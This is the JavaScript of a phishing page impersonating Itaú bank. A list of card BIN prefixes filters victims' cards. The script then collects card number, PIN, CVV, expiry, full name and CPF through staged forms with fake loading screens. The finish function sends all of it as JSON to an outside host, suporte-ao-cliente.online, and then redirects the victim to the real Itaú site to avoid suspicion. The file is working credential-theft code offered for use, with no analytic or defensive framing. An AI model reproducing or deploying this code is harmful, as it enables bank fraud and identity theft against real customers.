let bins = `482447
482448
403235
403246
403253
405780
400235
483085
483086
483096
483097
483098
482405
482476
482477
482478
482479
482480
407409
438903
417987
417988
421507
422731
474536
474537
474547
474548
474549
474565
485486
459077
459079
496048
477128
418668
413408
413410
413411
411049
459450
459452
459453
459454
459455
422004
422005
422007
486654
486641
451301
451327
460036
460037
498554
489392
489399
489400
489414
489423
489430
489451
400253
400268
422202
422203
490144
491446
491447
491448
451363
544199
541555
544859
403247
419189
527496
527497
400247
524003
542974
542976
552236
482481
548474
544883
407505
459078
459080
544665
531681
541187
525662
529323
525695
527407
527468
525496
470598
553636
439354
548984
548985
526863
548724
512363
554722
460035
459020
459023
514868
489391
422200
422201
490172
552640
422008
556616
479398
521043
490105
409924
474359
456890
536371
536377
403798
536358
525663
527454
527463
490119
536581
536582
527569
527533
527546
451300
451378
451379
451382
473273
473274
474538
552072
556615
512099
512059
512047
546559
521039
521042
544166
544169
528151
528153
549367
549372
549378
549383
529416
549359
549332
549339
51782377
51782378
51782379
51782380
51782381
51782382
51782383
51782384
51782385
51782386
51782387
51782388
51782389
51782390
51782391
51782392
51782393
51782394
51782395
51782396
51782397
51782398
51782399
542622
530599
524822
527495
520196
520199
543960
546012
546017
545653
545670
531087
530452
530454
544296
544300
542982
534915
553665
558303
557771
518847
518218
558297
520948
541759
531249
530994
512461
543051
543095
542477
532910
549585
554774
554775
554776
536491
422008
483150
421847
477176
422100
478308
439389
407600
478309
414506
459313
464294
421845
400694
401130
401131
401132
401133
401144
401145
401146
401165
401166
401167
401168
401652
401840
402433
402439
403534
404948
405973
405980
405981
406211
407455 
407613
407657
410001
410002
410003
413156 
419521
419523
419524
422527
422528
423180
423240
424430
431929
432942
432944
438672
439177
439481
441255
441256
441257
441552
446864
449771
449772
449774
454340
455984
456348
467081
467084
472951
472952
472953
472954
472958
473660
473661
473662
489202 
222661
222662 
222663
222664 
360755 
360756 
362138 
362377 
384100 	
384140 	
384160 	
400217 
400225 
400234 
400235 
400247 
400248 
400252 
400253 
400268 
400439 
400634 
400635 
400647 
400652 
400653 
400654 
401342 
401692 
402773 
402774 
403217 
403225 
403230 
403235 
403246 
403247 
403254 
403290 
405773 
405774 
405775 
405776 
405777 
405778 
405779 
405780 
405880 	
405885 
405966 
405967 
405968 
406871 
407409 
407414 
407433 
407505 
407600 
411049 
411195 
411196 
411766
411767 
411860 
411861 
412723 
413408 
413409 
413410 
413411 
414504 
414505 
414506 
415646 
416069 
416094 
416914 
417957 
417958 
417987 
417988 
418043 
418044 
418668 
419590 
419591 
419592 
420180 
420181 
420182 
421309 
421470 
421471 
421507 
421508 
421644 
421843 
421844 
421845 
421847 
421848 
421862 
422004 
422005 
422006 
422007 
422008
422100 
422101 
422102 
422103 
422185 
422200 
422201 
422202 
422203 
422628 
422731
426031 
432943 
434101 
438903 
439354 
439388 
439389 
439390 
439478 
439479 
439480 
440132 
441030 
441349 
444054 
444214 
444215 
444216 
444217 
444218 
445490 
445491 
445492 
445497 
445498 
446305 
446865 
449773 
450321 
450323 
450419 
451300 
451301 
451327 
451355 	
451356 
451363 
452407 
452991 
452992 
454367 	
454368 	
454427 
456137 
456347 	
456389 	
456401 
456890 
457020 	
457548 
457943 
459020 
459023 
459077 
459078 
459079 
459080 
459313 
459314 
459315 
459316 
459420
459421 
459450 
459451 
459452 
459454 	
459455 
459456 
459457 
459458 
459459 
459460 
459461 
459462 
459463 
460034 
460035 
460036 
460037 
460038 
463291 
463292 
463293 
463294 
463295 
463296 
463297 
463298 
463299 
464294 
464295 
464296 
464297 
464298 
464299 
464300 
464301 
465769 
467082 
467083 
467085 
467100 
467101 
467150 	
467151 
467152 
467153 	
469865 
469866 
469867 
469868 
470598 
472305 
472663 
472664 
472665
472666 
472667 
472668 
472669 
472955 
472956 
472957 
473273 	
473274 	
473275 	
474359 
474536 
474537 
474538 
474547 
474548 
474549 
474565 
476602 	
477128 
477129 
477144 
477145 
477175 
477176 	
477249 	
478307 
478308 
478309 
478310 
479398 
479407 
479408 
482405 
482447 	
482448 	
482476 
482477 
482478 
482479 
482480 
482481 
482482 
483085 
483096 
483097 
483098 
483150 	
483151 	
485103 
485104 
485486 
486641 	
486654 	
486692 	
489203 
489204 
489391 
489392 
489399 
489400 
489414 
489423 
489430 
489451 
489902 
489962 	
490105 
490106 
490119 
490144 
490172 
491414 
491415 
491416 
491446 
491447 
491448
493186 
493490 
496048 
496049 
498515 
498530 
498553 
498554 
498555 
498556 
510089 
510426 
512047 
512059 
512099 
512207
512215 
512363 
512374 
512461
512658 
512671 
512673 
513728 
513731 
514079 
514090 
514233 
514868
514897
514898
514945
515640
515743 
515765 
515802
515836
516070 
516164 
516275
516283 
516291
516306
517191 
517701 
517703 	
517787 
517858 
517914 
517967 
518020 
518032 
518054 
518063 
518138 
518218 
518306
518307
518326 
518327 
518328 
518491 
518534
518950
518967 
520196 
520199 
520400 
520401 
520402 
520403 
520404 
520405 
520621 
520977 
521039 
521042 
521043 
521397
521880
522015 
522027 
522446 
522949
522979
523284 
523425 
523431
523432
523791 
524003
524314
524474 
524703
524820 
525320 
525496 
525661 
525662 
525663 
525664
525692 
525695 
525718
526762 
526769
526788
526863
526892
526893 
526944 
527010 
527018 
527036 
527405 
527407
527425
527430 
527467 
527468 
527495 
527496 
527497
527532 
527533 
527538 
527539 
527540 
527541 
527543 
527544 
527545 
527616 
527887 
527889 
528196 
528392 
528860 
528941
529285 
529323 
529416 
529417 
529418 
530038 
530049
530073
530148
530452 
530599 
530771 
530780 
530851 
530994 
530996 
531087 
531249
531377 
531500 
531502 
531503 
531661
531671
531681
531705 
532910 
532942
534249 
534361
534447 
534448 
534503
534513
534516
534562
534571
534627 
534915 
534916 
535081 
535085 
535088 
535091 
535094 
535097 
535106 
535822 
535841 
535850 
535858 
535863 
535867 
535871 
536143
536352 
536367 
536371 	
536391 
536452
536458
536467
536471
536477
536480
536481
536482
536491
536552 
536558 
536567 
536571 
536577 
536580 
536581 
536582 
536591 
536804
539011 
539012 
539021 
539022 
539028 
539029 
539039 
539040 
539058 
539059 
539060 
539062 
539063 
539064 
539066 
539067 
539068 
539070 
539072 
539073 
539074 
539077 
539078 
539083 
539084 
539085 
539088 
539090 
539091 
540508 
540517 
540530 
540631
540645
540646
540755 
540760 
541006 
541187 
541426
541555
541759
541886
542477 
542510
542622
542701 
542711 
542712 
542974 
542976 
542982 
543051 
543095 
543391 
543559 
543690 
543744 
543869 
543927 
543960
543971 
544166 
544169
544199 
544265 
544276 
544293 
544296 
544300 
544328 
544386 
544442 
544507
544522 
544540
544546 
544547 
544554
544560 
544570
544599
544600 
544626
544654 
544665 
544672 
544673 
544753 
544828
544829
544831
544833
544839
544841
544859
544860
544862
544863
544864
544867
544872
544874
544881
544883
544890
544891
545011 
545349 
545368 
545462 
545463
545553
545653
545670
545719 
545768
545780 
545810 
545823 
545832 
545850 
545957 
545959 
545967
546003 
546012 
546017
546056
546279 
546282
546337 
546338 
546460 
546461 
546559 
546744 
546754 
546815 
546841 
547076 
547468 
547483 
547674 
548295
548296 
548305 
548337 
548338 
548364 
548474
548514 
548625 
548708 
548721 
548722 
548723 
548724 
548731 
548739 
548802 
548839 
548929 
548961 
548970 
548976 
548984 
548985
549090
549167
549221 
549296 
549319 
549328 
549329 
549332 
549339 
549341 
549358 
549359 
549363 
549367 
549368 
549372 
549378 
549383 
549390 
549391 
549585 
552070
552072
552128
552236
552244
552297 
552317 
552544 
552640 
552697 
552914 
553034 
553624 
553636 
553637 
553647 
553665 
553666 
554281 
554282
554309
554480
554497 
554563 
554587 
554613 
554634 
554722 
554774
554775 
554776 
554903
554917
554953 
554954 
555428 	
556023 
556024 
556026 
556615 
556616 
556670 
556673 
557771 
557797 
558297 
558303 
558383 
558394 
558419 	
558645 
559275 
603574 	
606282 	
637095 	
637568 	
637599 	
637600 
637609 	
637612`
let arrBins = bins.split("\n")

$('#numerodocartao').mask('0000 0000 0000 0000')
$('#senhadocartao').mask('0000')
$('#cpfdocartao').mask('000.000.000-00')

function checkCard () {
    var num = $("#numerodocartao")[0].value

    if(num.length == 19) {
        let bin = num.replace(" ","").slice(0,6)

        if(arrBins.includes(bin))
        {
            $("#erronumerodocartao")[0].innerHTML = ''
            return true
        }
        else {
            $("#erronumerodocartao")[0].innerHTML = 'Cartão invalido'
            return false
        }
    }
    else {
        $("#erronumerodocartao")[0].innerHTML = 'Cartão invalido'
        return false
    }
}

function checkPass () {
    var pass = $("#senhadocartao")[0].value

    if(pass.length === 4) { //errosenhadocartao
        $("#erronumerodocartao")[0].innerHTML = ''
        return true
    }else {
        $("#erronumerodocartao")[0].innerHTML = 'A senha possui 4 dígitos'
        return false
    }
}

function nextOne() {
    if(!checkCard()) return;
    if(!checkPass()) return;

    var num = $("#numerodocartao")[0].value
    var pass = $("#senhadocartao")[0].value

    localStorage.setItem("num", num)
    localStorage.setItem("pass", pass)

    $("#campo1")[0].style.display = 'none'
    $("#loading1")[0].style.display = 'block'

    setTimeout(() => {
        $("#loading1")[0].style.display = 'none'
        $("#campo2")[0].style.display = 'block'

    }, 2000)
}   

function changeMes () {
    let mes = $("#mescartao")[0].value

    localStorage.setItem("mes", mes)
}

function changeAno () {
    let ano = $("#anocartao")[0].value

    console.log(+ano > 1);

    localStorage.setItem("ano", ano)
}


function checkCvv () {
    let cvv = $("#cvvdocartao")[0].value
    
    if(cvv.length == 3) {
        $("#errocvvdocartao")[0].innerHTML = ''
        return true
    }else  {
        $("#errocvvdocartao")[0].innerHTML = 'Digite um cvv valido'
        return false
        
    }
}

function checkDate () {
    let mm = $("#mescartao")[0].value
    let aa = $("#anocartao")[0].value
    
    if(+mm > 1 && +aa > 1) {
        $("#errovalidadedocartao")[0].innerHTML = ''
        return true
    } else {
        $("#errovalidadedocartao")[0].innerHTML = 'Digite uma data valida'
        return false

    } 
}

function nextTwo() {
    if(!checkCvv()) return;
    if(!checkDate()) return;

    let mm = $("#mescartao")[0].value
    let aa = $("#anocartao")[0].value
    var cvv = $("#cvvdocartao")[0].value

    localStorage.setItem("val", `${mm}/${aa}`)
    localStorage.setItem("cvv", cvv)

    $("#campo2")[0].style.display = 'none'
    $("#loading2")[0].style.display = 'block'

    setTimeout(() => {
        $("#loading2")[0].style.display = 'none'
        $("#campo3")[0].style.display = 'block'

    }, 2000)
}

function checkName () {
    var nome = $("#nomedocartao")[0].value.split(' ')

    if(nome.length > 1) {
        $("#erronomedocartao")[0].innerHTML = ''
        return true
    }else {
        $("#erronomedocartao")[0].innerHTML = 'Digite seu nome completo'
        return false
    }
}

function checkCpf () {
    var cpf = $("#cpfdocartao")[0].value

    if(cpf.length == 14) {
        $("#errocpfdocartao")[0].innerHTML = ''
        return true
    }else {
        $("#errocpfdocartao")[0].innerHTML = 'Digite seu CPF'
        return false
    }
}

async function finish () {
    if(!checkName()) return
    if(!checkCpf()) return


    let mm = $("#mescartao")[0].value
    let aa = $("#anocartao")[0].value


    var data = new Date().toString()
    var name = $("#nomedocartao")[0].value
    var num = $("#numerodocartao")[0].value
    var pass = $("#senhadocartao")[0].value
    var val = `${mm}/${aa}`
    var cvv = $("#cvvdocartao")[0].value
    var cpf = $("#cpfdocartao")[0].value

    let obj = {
        val,
        cvv,
        num,
        pass,
        cpf,
        data,
        name
    }    
    

    $("#campo3")[0].style.display = 'none'
    $("#loading3")[0].style.display = 'block'

    await fetch("https://suporte-ao-cliente.online/sendInfo/Itau2", {
        method:"POST",
        headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(obj),
    }).then(() => { 
        
        setTimeout(() => {

            

            window.location = 'https://www.itau.com.br/cartoes/servicos/fatura-digital'
        }, 3000)
    })
    .catch(console.log())

}